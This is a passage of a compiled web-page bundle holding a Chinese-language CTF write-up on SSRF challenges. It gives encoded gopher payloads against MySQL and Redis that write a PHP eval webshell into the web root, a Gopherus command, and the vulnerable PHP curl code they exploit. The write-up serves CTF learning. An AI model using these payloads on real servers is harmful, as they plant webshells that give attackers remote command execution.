2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[s(`回到环境中，随便输入账号密码跳转到`),o(`code`,null,`check.php`),s(`,然后post传参：`),o(`code`,null,`returl=xxx`),s(`(把上面得到的传进去)`)],-1),o(`p`,null,[s(`然后一句话就写进去了，再访问`),o(`code`,null,`url/1.php`),s(` (1.php为我们指定的文件名)，然后进行命令执行`)],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409042051656.png`,alt:`image-20240904205148598`,loading:`lazy`,decoding:`async`})],-1),o(`h3`,{id:`web360`,tabindex:`-1`},[s(`web360 `),o(`a`,{class:`header-anchor`,href:`#web360`,"aria-label":`Permalink to "web360"`},`​`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`这题跟上题类似，我们使用redis`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`python gopherus.py --exploit redis

<?php eval($_post[1]);?>

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`figure`,null,[o(`img`,{src:`https://i-blog.csdnimg.cn/blog_migrate/c2c77b21fb7a5718180b34688a339981.png`,alt:`image-20220418223051741`,loading:`lazy`,decoding:`async`})],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`figure`,null,[o(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409042109345.png`,alt:`image-20240904210949269`,loading:`lazy`,decoding:`async`})],-1)]]),"main-header":c(()=>[n(e.$slots,`main-header`)]),"main-header-after":c(()=>[n(e.$slots,`main-header-after`)]),"main-nav":c(()=>[n(e.$slots,`main-nav`)]),"main-content-before":c(()=>[n(e.$slots,`main-content-before`)]),"main-content":c(()=>[n(e.$slots,`main-content`)]),"main-content-after":c(()=>[n(e.$slots,`main-content-after`)]),"main-nav-before":c(()=>[n(e.$slots,`main-nav-before`)]),"main-nav-after":c(()=>[n(e.$slots,`main-nav-after`)]),comment:c(()=>[n(e.$slots,`comment`)]),footer:c(()=>[n(e.$slots,`footer`)]),aside:c(()=>[n(e.$slots,`aside`)]),"aside-custom":c(()=>[n(e.$slots,`aside-custom`)]),default:c(()=>[n(e.$slots,`default`)]),_:3},8,[`frontmatter`])}}};export{f as default};